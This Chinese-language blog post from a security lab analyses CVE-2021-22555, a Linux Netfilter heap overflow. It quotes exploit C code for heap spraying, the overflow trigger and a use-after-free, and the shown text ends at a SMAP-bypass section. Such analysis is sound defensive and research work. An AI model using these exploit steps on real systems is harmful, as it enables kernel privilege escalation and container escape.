<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-114832940-2', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <title>CVE-2021-22555漏洞分析 | IceSword Lab</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="CVE-2021-22555漏洞分析author: moxingyuan from iceswordlab  一、漏洞背景CVE-2021-22555是一个存在了15年之久的内核堆溢出漏洞，它位于内核的Netfilter组件中，这个组件可以被用来实现防火墙、NAT等功能。 该漏洞在2006年由commit 9fa492cdc160cd27ce1046cb36f47d3b2b1efa21引入，并在2">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-22555漏洞分析">
<meta property="og:url" content="http://yoursite.com/2021/12/27/CVE-2021-22555/index.html">
<meta property="og:site_name" content="IceSword Lab">
<meta property="og:description" content="CVE-2021-22555漏洞分析author: moxingyuan from iceswordlab  一、漏洞背景CVE-2021-22555是一个存在了15年之久的内核堆溢出漏洞，它位于内核的Netfilter组件中，这个组件可以被用来实现防火墙、NAT等功能。 该漏洞在2006年由commit 9fa492cdc160cd27ce1046cb36f47d3b2b1efa21引入，并在2">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/1.png">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/2.png">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/4.png">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/5.png">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/6.png">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/7.png">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/8.png">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/9.png">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/10.png">
<meta property="og:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/11.png">
<meta property="article:published_time" content="2021-12-27T14:00:00.000Z">
<meta property="article:modified_time" content="2025-07-16T10:02:19.306Z">
<meta property="article:author" content="IceSword Lab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2021/12/27/CVE-2021-22555/1.png">
  
    <link rel="alternate" href="../../../../atom.xml" title="IceSword Lab" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="../../../../css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="../../../../index.html" id="logo">IceSword Lab</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="../../../../index.html" id="subtitle">Work hard in silence , let success make the noise.</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="../../../../index.html">Home</a>
        
          <a class="main-nav-link" href="../../../../archives">Archives</a>
        
          <a class="main-nav-link" href="../../../../research">Research</a>
        
          <a class="main-nav-link" href="../../../../vulnerabilities">Vulnerabilities</a>
        
          <a class="main-nav-link" href="../../../../recruitment">Recruitment</a>
        
          <a class="main-nav-link" href="../../../../about">About</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="../../../../atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-2021/12/27/CVE-2021-22555" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="" class="article-date">
  <time datetime="2021-12-27T14:00:00.000Z" itemprop="datePublished">2021-12-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      CVE-2021-22555漏洞分析
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2021-22555漏洞分析"><a href="#CVE-2021-22555漏洞分析" class="headerlink" title="CVE-2021-22555漏洞分析"></a>CVE-2021-22555漏洞分析</h1><p>author: moxingyuan from iceswordlab </p>
<h2 id="一、漏洞背景"><a href="#一、漏洞背景" class="headerlink" title="一、漏洞背景"></a>一、漏洞背景</h2><p>CVE-2021-22555是一个存在了15年之久的内核堆溢出漏洞，它位于内核的Netfilter组件中，这个组件可以被用来实现防火墙、NAT等功能。</p>
<p>该漏洞在2006年由commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/netfilter/x_tables.c?id=9fa492cdc160cd27ce1046cb36f47d3b2b1efa21" target="_blank" rel="noopener">9fa492cdc160cd27ce1046cb36f47d3b2b1efa21</a>引入，并在2021年由commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/net/netfilter/x_tables.c?id=9fa492cdc160cd27ce1046cb36f47d3b2b1efa21" target="_blank" rel="noopener">b29c457a6511435960115c0f548c4360d5f4801d</a>修复。</p>
<p>利用这个漏洞可以导致目标系统拒绝服务，甚至实现提权、容器逃逸并执行任意代码，危害等级极高。</p>
<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><p>漏洞位于net/netfilter/x_tables.c的xt_compat_target_from_user函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;git.kernel.org&#x2F;pub&#x2F;scm&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git&#x2F;tree&#x2F;net&#x2F;netfilter&#x2F;x_tables.c</span><br><span class="line">void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,</span><br><span class="line">				unsigned int *size)</span><br><span class="line">&#123;</span><br><span class="line">	const struct xt_target *target &#x3D; t-&gt;u.kernel.target;</span><br><span class="line">	struct compat_xt_entry_target *ct &#x3D; (struct compat_xt_entry_target *)t;</span><br><span class="line">	int pad, off &#x3D; xt_compat_target_offset(target);</span><br><span class="line">	u_int16_t tsize &#x3D; ct-&gt;u.user.target_size;</span><br><span class="line">	char name[sizeof(t-&gt;u.user.name)];</span><br><span class="line"></span><br><span class="line">	t &#x3D; *dstptr;</span><br><span class="line">	memcpy(t, ct, sizeof(*ct));</span><br><span class="line">	if (target-&gt;compat_from_user)</span><br><span class="line">		target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);</span><br><span class="line">	else</span><br><span class="line">		memcpy(t-&gt;data, ct-&gt;data, tsize - sizeof(*ct));</span><br><span class="line">	pad &#x3D; XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line">	if (pad &gt; 0)</span><br><span class="line">		memset(t-&gt;data + target-&gt;targetsize, 0, pad);</span><br><span class="line"></span><br><span class="line">	tsize +&#x3D; off;</span><br><span class="line">	t-&gt;u.user.target_size &#x3D; tsize;</span><br><span class="line">	strlcpy(name, target-&gt;name, sizeof(name));</span><br><span class="line">	module_put(target-&gt;me);</span><br><span class="line">	strncpy(t-&gt;u.user.name, name, sizeof(t-&gt;u.user.name));</span><br><span class="line"></span><br><span class="line">	*size +&#x3D; off;</span><br><span class="line">	*dstptr +&#x3D; tsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>缓冲区溢出发生在memset(t-&gt;data + target-&gt;targetsize, 0, pad)这个语句，其本意是讲已经对齐的缓冲区多余的pad个字节清零。由于在分配内存的时候没有考虑到对齐，t-&gt;data之后只有target-&gt;targetsize个字节的有效存储空间，导致这里会发生pad个字节的溢出。通过选择不同的target，可以控制targetsize，进而控制溢出字节数pad。</p>
<p>要让内核执行到有漏洞的xt_compat_target_from_user函数，需要在用户空间调用setsockopt，并提供IPT_SO_SET_REPLACE或IP6T_SO_SET_REPLACE作为第3个参数。这个操作需要用户进程拥有CAP_NET_ADMIN能力，而这个能力可以通过切换到新的用户+网络名称空间来获得。</p>
<h2 id="三、EXP分析"><a href="#三、EXP分析" class="headerlink" title="三、EXP分析"></a>三、EXP分析</h2><p><a href="https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/exploit.c" target="_blank" rel="noopener">EXP下载地址</a></p>
<p>EXP整体思路是利用堆溢出改写特殊链表的指针，进而实现UAF，最后改写特定内核结构体的函数指针来实现代码执行。</p>
<h3 id="3-1-实现UAF"><a href="#3-1-实现UAF" class="headerlink" title="3.1 实现UAF"></a>3.1 实现UAF</h3><h4 id="3-1-1-申请消息队列"><a href="#3-1-1-申请消息队列" class="headerlink" title="3.1.1 申请消息队列"></a>3.1.1 申请消息队列</h4><p>通过msgget申请NUM_MSQIDS个消息队列，在EXP中NUM_MSQIDS等于4096。消息队列数目没有特殊要求，数目越多则EXP越稳定，原因后面会解释。这步是为后面的堆喷做准备。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (int i &#x3D; 0; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">  if ((msqid[i] &#x3D; msgget(IPC_PRIVATE, IPC_CREAT | 0666)) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] msgget&quot;);</span><br><span class="line">    goto err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-1-2-发送主要消息"><a href="#3-1-2-发送主要消息" class="headerlink" title="3.1.2 发送主要消息"></a>3.1.2 发送主要消息</h4><p>通过msgsnd给每个消息队列都发送一个4096字节的消息，暂且称这些消息为主要消息，每个消息的内容是其所在消息队列的序号，分别为0-4095。注意这里所谓的4096字节并非指消息内容的长度，而是指消息传递到内核空间之后，内核为容纳该消息而开辟的堆缓冲区的大小，该缓冲区容纳了一个结构体msg_msg的实例和消息的实际内容，后面所提及的“消息长度”都是指内核缓冲区的长度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Spraying primary messages...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">  memset(&amp;msg_primary, 0, sizeof(msg_primary));</span><br><span class="line">  *(int *)&amp;msg_primary.mtext[0] &#x3D; MSG_TAG;</span><br><span class="line">  *(int *)&amp;msg_primary.mtext[4] &#x3D; i;</span><br><span class="line">  if (write_msg(msqid[i], &amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) &lt;</span><br><span class="line">      0)</span><br><span class="line">    goto err_rmid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int write_msg(int msqid, const void *msgp, size_t msgsz, long msgtyp) &#123;</span><br><span class="line">  *(long *)msgp &#x3D; msgtyp;</span><br><span class="line">  if (msgsnd(msqid, msgp, msgsz - sizeof(long), 0) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;[-] msgsnd&quot;);</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里所使用的msgsnd函数是最常用的堆喷手段之一，因为传递的消息内容会一成不变地复制到内核缓冲区中，这样就可以达到控制内核缓冲区内容的目的。当消息传递到内核空间时，内核是通过alloc_msg函数来申请堆缓冲区的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;git.kernel.org&#x2F;pub&#x2F;scm&#x2F;linux&#x2F;kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git&#x2F;tree&#x2F;ipc&#x2F;msgutil.c</span><br><span class="line">static struct msg_msg *alloc_msg(size_t len)</span><br><span class="line">&#123;</span><br><span class="line">	struct msg_msg *msg;</span><br><span class="line">	struct msg_msgseg **pseg;</span><br><span class="line">	size_t alen;</span><br><span class="line">	</span><br><span class="line">	&#x2F;&#x2F; 取实际消息长度len和DATALEN_MSG中的最小值为第一个消息分片的长度</span><br><span class="line">	alen &#x3D; min(len, DATALEN_MSG);</span><br><span class="line">	&#x2F;&#x2F; 为首个消息分片开辟缓冲区，长度为结构体msg_msg加上alen</span><br><span class="line">	msg &#x3D; kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	if (msg &#x3D;&#x3D; NULL)</span><br><span class="line">		return NULL;</span><br><span class="line"></span><br><span class="line">	msg-&gt;next &#x3D; NULL;</span><br><span class="line">	msg-&gt;security &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">	len -&#x3D; alen;</span><br><span class="line">	pseg &#x3D; &amp;msg-&gt;next;</span><br><span class="line">	&#x2F;&#x2F; 若首个消息分片不足以容纳完整的消息，将陆续开辟后续的消息分片</span><br><span class="line">	while (len &gt; 0) &#123;</span><br><span class="line">		struct msg_msgseg *seg;</span><br><span class="line"></span><br><span class="line">		cond_resched();</span><br><span class="line"></span><br><span class="line">		alen &#x3D; min(len, DATALEN_SEG);</span><br><span class="line">		&#x2F;&#x2F; 为后续消息分片开辟缓冲区，长度为结构体msg_msgseg加上alen</span><br><span class="line">		seg &#x3D; kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">		if (seg &#x3D;&#x3D; NULL)</span><br><span class="line">			goto out_err;</span><br><span class="line">		*pseg &#x3D; seg;</span><br><span class="line">		seg-&gt;next &#x3D; NULL;</span><br><span class="line">		pseg &#x3D; &amp;seg-&gt;next;</span><br><span class="line">		len -&#x3D; alen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	return msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">	free_msg(msg);</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，结构体msg_msg的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct msg_msg &#123;</span><br><span class="line">	struct list_head m_list;</span><br><span class="line">	long m_type;</span><br><span class="line">	size_t m_ts;		&#x2F;* message text size *&#x2F;</span><br><span class="line">	struct msg_msgseg *next;</span><br><span class="line">	void *security;</span><br><span class="line">	&#x2F;* the actual message follows immediately *&#x2F;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct list_head &#123;</span><br><span class="line">    struct list_head *next, *prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>内核为消息开辟好缓冲区后，会将其插入到每个消息队列中，形成一个双向链表，每个消息的m_list.next指针指向下一个消息，m_list.prev指向前一个消息。</p>
<p>需要注意的是，当消息实际内容的长度大于阈值DATALEN_MSG时，内核会对消息进行分片，这在利用过程中是必须要避免的，所幸的是这里选择的长度并不会导致消息分片。</p>
<p>发送完后，极大概率存在部分主要消息在地址上是连续的：</p>
<p><img src="/2021/12/27/CVE-2021-22555/1.png" alt></p>
<h4 id="3-1-3-发送次要消息"><a href="#3-1-3-发送次要消息" class="headerlink" title="3.1.3 发送次要消息"></a>3.1.3 发送次要消息</h4><p>再给每个消息队列发送1024个字节的次要消息，每个消息的内容同样是其所在消息队列的序号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Spraying secondary messages...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">  memset(&amp;msg_secondary, 0, sizeof(msg_secondary));</span><br><span class="line">  *(int *)&amp;msg_secondary.mtext[0] &#x3D; MSG_TAG;</span><br><span class="line">  *(int *)&amp;msg_secondary.mtext[4] &#x3D; i;</span><br><span class="line">  if (write_msg(msqid[i], &amp;msg_secondary, sizeof(msg_secondary),</span><br><span class="line">                MTYPE_SECONDARY) &lt; 0)</span><br><span class="line">    goto err_rmid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发送完后，每个主要消息后面都会跟着一个次要消息，且它们的内容是相同的：</p>
<p><img src="/2021/12/27/CVE-2021-22555/2.png" alt></p>
<h4 id="3-1-4-释放部分主要消息"><a href="#3-1-4-释放部分主要消息" class="headerlink" title="3.1.4 释放部分主要消息"></a>3.1.4 释放部分主要消息</h4><p>从第1024号队列开始，每隔1024个队列释放一个主要消息，这一步释放的缓冲区将在后面触发漏洞时重新申请使用，将间隔设置为1024也是因为这样选出的主要消息所在的内存位置之后紧邻另一个主要消息的可能性更大。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Creating holes in primary messages...\n&quot;);</span><br><span class="line">for (int i &#x3D; HOLE_STEP; i &lt; NUM_MSQIDS; i +&#x3D; HOLE_STEP) &#123;</span><br><span class="line">  if (read_msg(msqid[i], &amp;msg_primary, sizeof(msg_primary), MTYPE_PRIMARY) &lt;</span><br><span class="line">      0)</span><br><span class="line">    goto err_rmid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-1-5-触发缓冲区溢出漏洞"><a href="#3-1-5-触发缓冲区溢出漏洞" class="headerlink" title="3.1.5 触发缓冲区溢出漏洞"></a>3.1.5 触发缓冲区溢出漏洞</h4><p>重新申请上一步释放的缓冲区，同时触发缓冲区溢出漏洞，将缓冲区外2个字节覆盖为0。前面提到，上一步释放的缓冲区后面极大概率紧跟着一个主要消息，这是因为前面发送了大量主要消息，将内核内存分配器能分配的内存空洞都填满了之后，所获得的缓冲区极大概率是相邻的。所以，申请的消息队列数目越多，发送越多的主要消息，内存空洞被填满的概率越大，EXP也就越稳定。在这种理想情况下，这一步会将缓冲区后面的主要消息的next指针的最低位2个字节覆盖为0，导致其指向另外一个次要消息。这样，就会有2个主要消息的next指针指向同一个次要消息。</p>
<p><img src="/2021/12/27/CVE-2021-22555/4.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Triggering out-of-bounds write...\n&quot;);</span><br><span class="line">if (trigger_oob_write(s) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br><span class="line"></span><br><span class="line">int trigger_oob_write(int s) &#123;</span><br><span class="line">  struct __attribute__((__packed__)) &#123;</span><br><span class="line">    struct ipt_replace replace;</span><br><span class="line">    struct ipt_entry entry;</span><br><span class="line">    struct xt_entry_match match;</span><br><span class="line">    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];</span><br><span class="line">    struct xt_entry_target target;</span><br><span class="line">  &#125; data &#x3D; &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">  data.replace.num_counters &#x3D; 1;</span><br><span class="line">  data.replace.num_entries &#x3D; 1;</span><br><span class="line">  data.replace.size &#x3D; (sizeof(data.entry) + sizeof(data.match) +</span><br><span class="line">                       sizeof(data.pad) + sizeof(data.target));</span><br><span class="line"></span><br><span class="line">  data.entry.next_offset &#x3D; (sizeof(data.entry) + sizeof(data.match) +</span><br><span class="line">                            sizeof(data.pad) + sizeof(data.target));</span><br><span class="line">  data.entry.target_offset &#x3D;</span><br><span class="line">      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));</span><br><span class="line"></span><br><span class="line">  data.match.u.user.match_size &#x3D; (sizeof(data.match) + sizeof(data.pad));</span><br><span class="line">  strcpy(data.match.u.user.name, &quot;icmp&quot;);</span><br><span class="line">  data.match.u.user.revision &#x3D; 0;</span><br><span class="line"></span><br><span class="line">  data.target.u.user.target_size &#x3D; sizeof(data.target);</span><br><span class="line">  strcpy(data.target.u.user.name, &quot;NFQUEUE&quot;);</span><br><span class="line">  data.target.u.user.revision &#x3D; 1;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Partially overwrite the adjacent buffer with 2 bytes of zero.</span><br><span class="line">  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, sizeof(data)) !&#x3D; 0) &#123;</span><br><span class="line">    if (errno &#x3D;&#x3D; ENOPROTOOPT) &#123;</span><br><span class="line">      printf(&quot;[-] Error ip_tables module is not loaded.\n&quot;);</span><br><span class="line">      return -1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-1-6-实现UAF"><a href="#3-1-6-实现UAF" class="headerlink" title="3.1.6 实现UAF"></a>3.1.6 实现UAF</h4><p>利用带MSG_COPY参数的msgrcv函数搜索同一消息队列但内容不同的主要消息和次要消息，这样就可以在不释放消息缓冲区的前提下查看消息内容。前面提到，同一消息队列的主要消息和次要消息的内容在正常情况下应该是相同的，如果不同，说明该主要消息的next指针在上一步被改写了，导致2个消息队列包含同一个次要消息。再释放其中一个队列的次要消息，由于另一个队列还在使用该次要消息，就实现了UAF。</p>
<p><img src="/2021/12/27/CVE-2021-22555/5.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[*] Searching for corrupted primary message...\n&quot;);</span><br><span class="line">for (int i &#x3D; 0; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">  if (i !&#x3D; 0 &amp;&amp; (i % HOLE_STEP) &#x3D;&#x3D; 0)</span><br><span class="line">    continue;</span><br><span class="line">  if (peek_msg(msqid[i], &amp;msg_secondary, sizeof(msg_secondary), 1) &lt; 0)</span><br><span class="line">    goto err_no_rmid;</span><br><span class="line">  if (*(int *)&amp;msg_secondary.mtext[0] !&#x3D; MSG_TAG) &#123;</span><br><span class="line">    printf(&quot;[-] Error could not corrupt any primary message.\n&quot;);</span><br><span class="line">    goto err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line">  if (*(int *)&amp;msg_secondary.mtext[4] !&#x3D; i) &#123;</span><br><span class="line">    fake_idx &#x3D; i;</span><br><span class="line">    real_idx &#x3D; *(int *)&amp;msg_secondary.mtext[4];</span><br><span class="line">    break;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (fake_idx &#x3D;&#x3D; -1 &amp;&amp; real_idx &#x3D;&#x3D; -1) &#123;</span><br><span class="line">  printf(&quot;[-] Error could not corrupt any primary message.\n&quot;);</span><br><span class="line">  goto err_no_rmid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; fake_idx&#39;s primary message has a corrupted next pointer; wrongly</span><br><span class="line">&#x2F;&#x2F; pointing to real_idx&#39;s secondary message.</span><br><span class="line">printf(&quot;[+] fake_idx: %x\n&quot;, fake_idx);</span><br><span class="line">printf(&quot;[+] real_idx: %x\n&quot;, real_idx);</span><br><span class="line"></span><br><span class="line">printf(&quot;[*] Freeing real secondary message...\n&quot;);</span><br><span class="line">if (read_msg(msqid[real_idx], &amp;msg_secondary, sizeof(msg_secondary),</span><br><span class="line">              MTYPE_SECONDARY) &lt; 0)</span><br><span class="line">  goto err_rmid;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-绕过SMAP"><a href="#3-2-绕过SMAP" class="headerlink" title="3.2 绕过SMAP"></a>3.2 绕过SMAP</h3><p>如果内核开启了SMAP，用户空间的数据将不能被内核访问，就需要通过信息泄露获取内核空间的地址来利用内核空间的数据。</p>
<h4 id="3-2-1-构造伪次要消息"><a href="#3-2-1-构造伪次要消息" class="headerlink" title="3.2.1 构造伪次要消息"></a>3.2.1 构造伪次要消息</h4><p>上一步释放了一个次要消息所占据的缓冲区，为了方便说明，后面称之为关键缓冲区。关键缓冲区虽然被释放了，但还是有一个消息队列在使用关键缓冲区。</p>
<p>通过write函数向UNIX socket写入数据的方式构造许多个伪次要消息，之所以要构造多个，是为了切实地将虚假数据写入已经被释放的关键缓冲区中。这也是实现堆喷的重要手段，由于没有多余的数据结构占据通过该手段写入的缓冲区，因而可以完全控制内核缓冲区的内容。</p>
<p>这里构造的伪次要消息的m_ts字段（表示消息内容长度的字段）为不需要分片的最大消息内容长度，要远远大于1024字节的真实次要消息内容长度，相当于将相邻的次要消息也纳入伪次要消息的范围。</p>
<p><img src="/2021/12/27/CVE-2021-22555/6.png" alt></p>
